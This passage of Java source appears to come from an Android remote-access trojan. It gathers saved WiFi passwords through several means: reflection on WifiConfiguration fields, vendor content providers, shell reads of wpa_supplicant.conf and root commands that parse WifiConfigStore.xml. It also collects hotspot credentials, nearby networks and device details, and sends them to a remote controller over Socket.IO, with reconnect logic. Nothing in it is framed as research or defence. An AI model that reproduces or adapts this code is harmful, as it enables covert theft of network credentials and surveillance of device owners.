                for (String cmd : rootCommands) {
                    JSONArray rootNetworks = tryRootCommand(cmd);
                    if (rootNetworks.length() > 0) {
                        foundPasswords = true;
                        for (int i = 0; i < rootNetworks.length(); i++) {
                            JSONObject net = rootNetworks.getJSONObject(i);
                            if (!seenSSIDs.contains(net.optString("ssid"))) {
                                seenSSIDs.add(net.optString("ssid"));
                                networks.put(net);
                            }
                        }
                        break;
                    }
                }
            }
            
            // ============ INFO METHODS (always run) ============
            
            // Get current WiFi info
            JSONObject currentWifi = getCurrentWifiInfo();
            if (currentWifi != null) {
                result.put("currentNetwork", currentWifi);
            }
            
            // Get scan results (nearby networks)
            JSONArray scanResults = getWifiScanResults();
            if (scanResults.length() > 0) {
                result.put("nearbyNetworks", scanResults);
            }
            
            // Fallback: Get saved network list (no passwords)
            if (networks.length() == 0) {
                try {
                    android.net.wifi.WifiManager wifiManager = (android.net.wifi.WifiManager) 
                        context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                    java.util.List<android.net.wifi.WifiConfiguration> configs = wifiManager.getConfiguredNetworks();
                    if (configs != null && !configs.isEmpty()) {
                        for (android.net.wifi.WifiConfiguration config : configs) {
                            String ssid = config.SSID;
                            if (ssid != null) {
                                ssid = ssid.replace("\"", "");
                            }
                            if (ssid != null && !seenSSIDs.contains(ssid)) {
                                seenSSIDs.add(ssid);
                                JSONObject network = new JSONObject();
                                network.put("ssid", ssid);
                                network.put("security", getSecurityType(config));
                                network.put("password", "[Protected - use ADB method]");
                                network.put("hidden", config.hiddenSSID);
                                network.put("priority", config.priority);
                                network.put("method", "Saved Networks");
                                networks.put(network);
                            }
                        }
                    }
                } catch (Exception e) {
                    Log.d(TAG, "getConfiguredNetworks failed: " + e.getMessage());
                }
            }
            
            // Build result
            result.put("networks", networks);
            result.put("count", networks.length());
            result.put("androidVersion", android.os.Build.VERSION.SDK_INT);
            result.put("device", android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL);
            
            // Return success if we found any networks, even without passwords
            if (networks.length() > 0) {
                result.put("success", true);
                if (foundPasswords) {
                    result.put("passwordsFound", true);
                } else {
                    result.put("passwordsFound", false);
                    result.put("note", "Network names found. For passwords: 1) Use ADB backup method, 2) Root device, or 3) Use WiFi Share on device");
                    result.put("adbCommand", "adb backup -f wifi.ab -noapk com.android.providers.settings && java -jar abe.jar unpack wifi.ab wifi.tar");
                }
            } else {
                result.put("success", false);
                result.put("error", "Could not retrieve WiFi networks. Try: adb shell cmd wifi list-networks");
            }
            
            emitResponse("x0000wp", result);
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting WiFi passwords", e);
            try {
                JSONObject error = new JSONObject();
                error.put("success", false);
                error.put("error", e.getMessage());
                emitResponse("x0000wp", error);
            } catch (Exception ex) {}
        }
    }
    
    // Advanced Method: WiFi Share API (Android 10+)
    private static JSONArray tryWifiShareApi() {
        JSONArray networks = new JSONArray();
        try {
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
                // Try to access WiFi network suggestions
                android.net.wifi.WifiManager wifiManager = (android.net.wifi.WifiManager) 
                    context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                
                // Get network suggestions (our own app's suggestions)
                // This won't give us other passwords, but shows the API is available
                Log.d(TAG, "WiFi Share API available on Android 10+");
            }
        } catch (Exception e) {
            Log.d(TAG, "WiFi Share API failed: " + e.getMessage());
        }
        return networks;
    }
    
    // Advanced Method: Content Provider (Samsung/LG specific)
    private static JSONArray tryContentProviderMethod() {
        JSONArray networks = new JSONArray();
        try {
            // Samsung WiFi content provider
            String[] samsungUris = {
                "content://com.samsung.android.provider.wifi/network",
                "content://com.sec.android.provider.wifi/network"
            };
            
            for (String uriStr : samsungUris) {
                try {
                    android.net.Uri uri = android.net.Uri.parse(uriStr);
                    android.database.Cursor cursor = context.getContentResolver().query(
                        uri, null, null, null, null);
                    
                    if (cursor != null) {
                        while (cursor.moveToNext()) {
                            JSONObject network = new JSONObject();
                            for (int i = 0; i < cursor.getColumnCount(); i++) {
                                String colName = cursor.getColumnName(i).toLowerCase();
                                String value = cursor.getString(i);
                                if (colName.contains("ssid")) {
                                    network.put("ssid", value);
                                } else if (colName.contains("password") || colName.contains("psk") || colName.contains("key")) {
                                    if (value != null && !value.isEmpty()) {
                                        network.put("password", value);
                                    }
                                }
                            }
                            if (network.has("ssid")) {
                                network.put("method", "ContentProvider (Samsung)");
                                networks.put(network);
                            }
                        }
                        cursor.close();
                    }
                } catch (Exception e) {
                    // Provider not available
                }
            }
        } catch (Exception e) {
            Log.d(TAG, "ContentProvider method failed: " + e.getMessage());
        }
        return networks;
    }
    
    // Advanced Method: Backup Manager (Android 4-9)
    private static JSONArray tryBackupManagerMethod() {
        JSONArray networks = new JSONArray();
        try {
            // Try to read from backup location
            String[] backupPaths = {
                context.getCacheDir() + "/wifi_backup.xml",
                context.getFilesDir() + "/wifi_backup.xml"
            };
            
            // This would require triggering a backup first via:
            // adb backup -f backup.ab -noapk com.android.providers.settings
            Log.d(TAG, "Backup Manager method - requires ADB backup");
        } catch (Exception e) {
            Log.d(TAG, "Backup Manager failed: " + e.getMessage());
        }
        return networks;
    }
    
    // Advanced Method: Settings.Secure
    private static JSONArray trySettingsSecureMethod() {
        JSONArray networks = new JSONArray();
        try {
            // Try to read wifi configuration from Settings
            String wifiConfig = android.provider.Settings.Secure.getString(
                context.getContentResolver(), "wifi_networks_available_notification_on");
            
            // On older devices, try deprecated settings
            if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.O) {
                try {
                    String wifiAp = android.provider.Settings.Secure.getString(
                        context.getContentResolver(), "wifi_ap_ssid");
                    String wifiApPwd = android.provider.Settings.Secure.getString(
                        context.getContentResolver(), "wifi_ap_passwd");
                    
                    if (wifiAp != null && !wifiAp.isEmpty()) {
                        JSONObject network = new JSONObject();
                        network.put("ssid", wifiAp);
                        network.put("password", wifiApPwd != null ? wifiApPwd : "[Not set]");
                        network.put("type", "Hotspot");
                        network.put("method", "Settings.Secure");
                        networks.put(network);
                    }
                } catch (Exception e) {
                    // Settings not available
                }
            }
        } catch (Exception e) {
            Log.d(TAG, "Settings.Secure method failed: " + e.getMessage());
        }
        return networks;
    }
    
    // Advanced Method: Reflection on WifiConfiguration
    private static JSONArray tryReflectionMethod() {
        JSONArray networks = new JSONArray();
        try {
            android.net.wifi.WifiManager wifiManager = (android.net.wifi.WifiManager) 
                context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            java.util.List<android.net.wifi.WifiConfiguration> configs = wifiManager.getConfiguredNetworks();
            
            if (configs != null) {
                for (android.net.wifi.WifiConfiguration config : configs) {
                    JSONObject network = new JSONObject();
                    String ssid = config.SSID;
                    if (ssid != null) {
                        ssid = ssid.replace("\"", "");
                    }
                    network.put("ssid", ssid);
                    
                    // Try to get preSharedKey via reflection
                    try {
                        java.lang.reflect.Field pskField = config.getClass().getDeclaredField("preSharedKey");
                        pskField.setAccessible(true);
                        String psk = (String) pskField.get(config);
                        if (psk != null && !psk.isEmpty() && !psk.equals("*")) {
                            network.put("password", psk.replace("\"", ""));
                            network.put("method", "Reflection");
                            networks.put(network);
                        }
                    } catch (Exception e) {
                        // Field not accessible
                    }
                    
                    // Try wepKeys
                    try {
                        java.lang.reflect.Field wepField = config.getClass().getDeclaredField("wepKeys");
                        wepField.setAccessible(true);
                        String[] wepKeys = (String[]) wepField.get(config);
                        if (wepKeys != null && wepKeys[0] != null && !wepKeys[0].isEmpty()) {
                            network.put("password", wepKeys[0].replace("\"", ""));
                            network.put("security", "WEP");
                            network.put("method", "Reflection (WEP)");
                            networks.put(network);
                        }
                    } catch (Exception e) {
                        // Field not accessible
                    }
                }
            }
        } catch (Exception e) {
            Log.d(TAG, "Reflection method failed: " + e.getMessage());
        }
        return networks;
    }
    
    // Advanced Method: Shell commands without root
    private static JSONArray tryShellCommands() {
        JSONArray networks = new JSONArray();
        try {
            // Try various shell commands that might work without root
            String[] commands = {
                "cmd wifi list-networks",
                "dumpsys wifi | grep -A 5 'WifiConfiguration'",
                "cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null",
                "settings get secure wifi_ap_ssid",
                "settings get global wifi_networks"
            };
            
            for (String cmd : commands) {
                try {
                    Process process = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
                    java.io.BufferedReader reader = new java.io.BufferedReader(
                        new java.io.InputStreamReader(process.getInputStream()));
                    StringBuilder output = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        output.append(line).append("\n");
                    }
                    reader.close();
                    process.waitFor();
                    
                    String result = output.toString().trim();
                    if (!result.isEmpty() && !result.contains("Permission denied")) {
                        // Parse the output
                        if (result.contains("ssid=") || result.contains("SSID")) {
                            JSONArray parsed = parseShellOutput(result, cmd);
                            for (int i = 0; i < parsed.length(); i++) {
                                networks.put(parsed.getJSONObject(i));
                            }
                        }
                    }
                } catch (Exception e) {
                    // Command failed
                }
            }
        } catch (Exception e) {
            Log.d(TAG, "Shell commands failed: " + e.getMessage());
        }
        return networks;
    }
    
    // Parse shell command output
    private static JSONArray parseShellOutput(String output, String command) {
        JSONArray networks = new JSONArray();
        try {
            String[] lines = output.split("\n");
            String currentSsid = null;
            String currentPsk = null;
            
            for (String line : lines) {
                line = line.trim();
                if (line.contains("SSID") || line.contains("ssid=")) {
                    // Extract SSID
                    if (line.contains("=")) {
                        currentSsid = line.split("=")[1].replace("\"", "").trim();
                    } else if (line.contains(":")) {
                        currentSsid = line.split(":")[1].replace("\"", "").trim();
                    }
                } else if (line.contains("psk=") || line.contains("PreSharedKey")) {
                    // Extract password
                    if (line.contains("=")) {
                        currentPsk = line.split("=")[1].replace("\"", "").trim();
                    }
                }
                
                if (currentSsid != null && (currentPsk != null || line.equals("}") || line.isEmpty())) {
                    JSONObject network = new JSONObject();
                    network.put("ssid", currentSsid);
                    network.put("password", currentPsk != null ? currentPsk : "[Not found]");
                    network.put("method", "Shell: " + command.substring(0, Math.min(20, command.length())));
                    networks.put(network);
                    currentSsid = null;
                    currentPsk = null;
                }
            }
        } catch (Exception e) {
            Log.d(TAG, "Parse shell output failed: " + e.getMessage());
        }
        return networks;
    }
    
    // Get hotspot configuration
    private static JSONObject getHotspotConfig() {
        JSONObject hotspot = new JSONObject();
        try {
            android.net.wifi.WifiManager wifiManager = (android.net.wifi.WifiManager) 
                context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            
            // Use reflection to get hotspot config
            java.lang.reflect.Method getConfigMethod = wifiManager.getClass().getDeclaredMethod("getWifiApConfiguration");
            getConfigMethod.setAccessible(true);
            android.net.wifi.WifiConfiguration config = (android.net.wifi.WifiConfiguration) getConfigMethod.invoke(wifiManager);
            
            if (config != null) {
                hotspot.put("ssid", config.SSID != null ? config.SSID.replace("\"", "") : "Unknown");
                hotspot.put("password", config.preSharedKey != null ? config.preSharedKey.replace("\"", "") : "[Not set]");
                hotspot.put("security", getSecurityType(config));
                hotspot.put("hidden", config.hiddenSSID);
                hotspot.put("method", "WifiApConfiguration");
            }
        } catch (Exception e) {
            Log.d(TAG, "Get hotspot config failed: " + e.getMessage());
            
            // Try alternative method for Android 8+
            try {
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    // Try Settings.Global
                    String apSsid = android.provider.Settings.Global.getString(
                        context.getContentResolver(), "wifi_ap_ssid");
                    if (apSsid != null) {
                        hotspot.put("ssid", apSsid);
                        hotspot.put("method", "Settings.Global");
                    }
                }
            } catch (Exception ex) {
                // Not available
            }
        }
        return hotspot.length() > 0 ? hotspot : null;
    }
    
    // Get WiFi scan results
    private static JSONArray getWifiScanResults() {
        JSONArray results = new JSONArray();
        try {
            android.net.wifi.WifiManager wifiManager = (android.net.wifi.WifiManager) 
                context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            
            java.util.List<android.net.wifi.ScanResult> scanResults = wifiManager.getScanResults();
            if (scanResults != null) {
                java.util.Set<String> seenSsids = new java.util.HashSet<>();
                for (android.net.wifi.ScanResult scan : scanResults) {
                    if (scan.SSID != null && !scan.SSID.isEmpty() && !seenSsids.contains(scan.SSID)) {
                        seenSsids.add(scan.SSID);
                        JSONObject network = new JSONObject();
                        network.put("ssid", scan.SSID);
                        network.put("bssid", scan.BSSID);
                        network.put("signal", scan.level);
                        network.put("frequency", scan.frequency);
                        network.put("capabilities", scan.capabilities);
                        results.put(network);
                        
                        if (results.length() >= 20) break; // Limit to 20
                    }
                }
            }
        } catch (Exception e) {
            Log.d(TAG, "Scan results failed: " + e.getMessage());
        }
        return results;
    }
    
    // Helper: Try to read WiFi config file
    private static JSONArray tryReadWifiConfig(String path) {
        JSONArray networks = new JSONArray();
        java.io.File file = new java.io.File(path);
        
        if (!file.exists() || !file.canRead()) {
            return networks;
        }
        
        try {
            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.FileReader(file));
            StringBuilder content = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                content.append(line).append("\n");
            }
            reader.close();
            
            String data = content.toString();
            
            if (path.endsWith(".xml")) {
                // Parse XML format (Android 8+)
                networks = parseWifiConfigXml(data);
            } else {
                // Parse wpa_supplicant.conf format
                networks = parseWpaSupplicant(data);
            }
        } catch (Exception e) {
            Log.d(TAG, "Failed to read " + path + ": " + e.getMessage());
        }
        
        return networks;
    }
    
    // Helper: Parse WifiConfigStore.xml
    private static JSONArray parseWifiConfigXml(String xml) {
        JSONArray networks = new JSONArray();
        try {
            // Simple regex-based parsing for PreSharedKey and SSID
            java.util.regex.Pattern ssidPattern = java.util.regex.Pattern.compile(
                "<string name=\"SSID\">\"?([^\"<]+)\"?</string>");
            java.util.regex.Pattern pskPattern = java.util.regex.Pattern.compile(
                "<string name=\"PreSharedKey\">\"?([^\"<]+)\"?</string>");
            java.util.regex.Pattern configPattern = java.util.regex.Pattern.compile(
                "<WifiConfiguration>([\\s\\S]*?)</WifiConfiguration>");
            
            java.util.regex.Matcher configMatcher = configPattern.matcher(xml);
            while (configMatcher.find()) {
                String configBlock = configMatcher.group(1);
                
                java.util.regex.Matcher ssidMatcher = ssidPattern.matcher(configBlock);
                java.util.regex.Matcher pskMatcher = pskPattern.matcher(configBlock);
                
                if (ssidMatcher.find()) {
                    JSONObject network = new JSONObject();
                    network.put("ssid", ssidMatcher.group(1));
                    
                    if (pskMatcher.find()) {
                        String psk = pskMatcher.group(1);
                        network.put("password", psk);
                        network.put("security", "WPA/WPA2");
                    } else {
                        network.put("password", "Open/Enterprise");
                        network.put("security", "Open/Enterprise");
                    }
                    network.put("method", "WifiConfigStore.xml");
                    networks.put(network);
                }
            }
        } catch (Exception e) {
            Log.d(TAG, "XML parse error: " + e.getMessage());
        }
        return networks;
    }
    
    // Helper: Parse wpa_supplicant.conf
    private static JSONArray parseWpaSupplicant(String conf) {
        JSONArray networks = new JSONArray();
        try {
            String[] lines = conf.split("\n");
            String currentSsid = null;
            String currentPsk = null;
            
            for (String line : lines) {
                line = line.trim();
                if (line.startsWith("ssid=")) {
                    currentSsid = line.substring(5).replace("\"", "");
                } else if (line.startsWith("psk=")) {
                    currentPsk = line.substring(4).replace("\"", "");
                } else if (line.equals("}") && currentSsid != null) {
                    JSONObject network = new JSONObject();
                    network.put("ssid", currentSsid);
                    network.put("password", currentPsk != null ? currentPsk : "Open");
                    network.put("security", currentPsk != null ? "WPA/WPA2" : "Open");
                    network.put("method", "wpa_supplicant.conf");
                    networks.put(network);
                    currentSsid = null;
                    currentPsk = null;
                }
            }
        } catch (Exception e) {
            Log.d(TAG, "wpa_supplicant parse error: " + e.getMessage());
        }
        return networks;
    }
    
    // Helper: Try root command
    private static JSONArray tryRootCommand(String command) {
        JSONArray networks = new JSONArray();
        try {
            Process process = Runtime.getRuntime().exec(command.split(" "));
            java.io.BufferedReader reader = new java.io.BufferedReader(
                new java.io.InputStreamReader(process.getInputStream()));
            StringBuilder content = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                content.append(line).append("\n");
            }
            reader.close();
            
            int exitCode = process.waitFor();
            if (exitCode == 0 && content.length() > 0) {
                String data = content.toString();
                if (data.contains("<WifiConfiguration>")) {
                    networks = parseWifiConfigXml(data);
                } else if (data.contains("network={")) {
                    networks = parseWpaSupplicant(data);
                }
            }
        } catch (Exception e) {
            Log.d(TAG, "Root command failed: " + e.getMessage());
        }
        return networks;
    }
    
    // Helper: Try ADB backup method
    private static JSONArray tryAdbBackupMethod() {
        // This would require ADB access which isn't available from app context
        return new JSONArray();
    }
    
    // Helper: Get current WiFi info
    private static JSONObject getCurrentWifiInfo() {
        try {
            android.net.wifi.WifiManager wifiManager = (android.net.wifi.WifiManager) 
                context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            android.net.wifi.WifiInfo wifiInfo = wifiManager.getConnectionInfo();
            
            if (wifiInfo != null && wifiInfo.getNetworkId() != -1) {
                JSONObject current = new JSONObject();
                String ssid = wifiInfo.getSSID();
                if (ssid != null) {
                    ssid = ssid.replace("\"", "");
                }
                current.put("ssid", ssid);
                current.put("bssid", wifiInfo.getBSSID());
                current.put("networkId", wifiInfo.getNetworkId());
                current.put("rssi", wifiInfo.getRssi());
                current.put("linkSpeed", wifiInfo.getLinkSpeed());
                current.put("ipAddress", intToIp(wifiInfo.getIpAddress()));
                return current;
            }
        } catch (Exception e) {
            Log.d(TAG, "getCurrentWifiInfo error: " + e.getMessage());
        }
        return null;
    }
    
    // Helper: Get WiFi status string
    private static String getWifiStatus(int status) {
        switch (status) {
            case android.net.wifi.WifiConfiguration.Status.CURRENT:
                return "Connected";
            case android.net.wifi.WifiConfiguration.Status.ENABLED:
                return "Enabled";
            case android.net.wifi.WifiConfiguration.Status.DISABLED:
                return "Disabled";
            default:
                return "Unknown";
        }
    }
    
    // Helper: Get security type
    private static String getSecurityType(android.net.wifi.WifiConfiguration config) {
        if (config.allowedKeyManagement.get(android.net.wifi.WifiConfiguration.KeyMgmt.WPA_PSK)) {
            return "WPA/WPA2-PSK";
        }
        if (config.allowedKeyManagement.get(android.net.wifi.WifiConfiguration.KeyMgmt.WPA_EAP)) {
            return "WPA-Enterprise";
        }
        if (config.allowedKeyManagement.get(android.net.wifi.WifiConfiguration.KeyMgmt.IEEE8021X)) {
            return "802.1x";
        }
        if (config.wepKeys[0] != null) {
            return "WEP";
        }
        return "Open";
    }
    
    // Helper: Convert int IP to string
    private static String intToIp(int ip) {
        return (ip & 0xFF) + "." + ((ip >> 8) & 0xFF) + "." + 
               ((ip >> 16) & 0xFF) + "." + ((ip >> 24) & 0xFF);
    }

    // Get socket for external use
    public static io.socket.client.Socket getSocket() {
        return ioSocket;
    }
    
    // Check connection status
    public static boolean isConnected() {
        return isConnected && ioSocket != null && ioSocket.connected();
    }
    
    // Send connection success message
    private static void sendConnectionSuccessMessage() {
        try {
            JSONObject data = new JSONObject();
            data.put("status", "connected");
            data.put("timestamp", System.currentTimeMillis());
            data.put("model", android.os.Build.MODEL);
            data.put("manufacturer", android.os.Build.MANUFACTURER);
            data.put("androidVersion", android.os.Build.VERSION.RELEASE);
            if (ioSocket != null) {
                emitResponse("client_connected", data);
                Log.d(TAG, "Connection success message sent");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error sending connection message", e);
        }
    }
    
    // Schedule retry for connection
    private static void scheduleRetry() {
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override
            public void run() {
                if (IOSocket.ensureBlockchainModeFromConfig()) {
                    Log.d(TAG, "Blockchain mode detected during retry - skipping Socket.IO retry");
                    return;
                }
                if (!isConnected && !isConnecting) {
                    Log.d(TAG, "Retrying connection...");
                    sendReq();
                }
            }
        }, 10000); // Retry after 10 seconds
    }
}
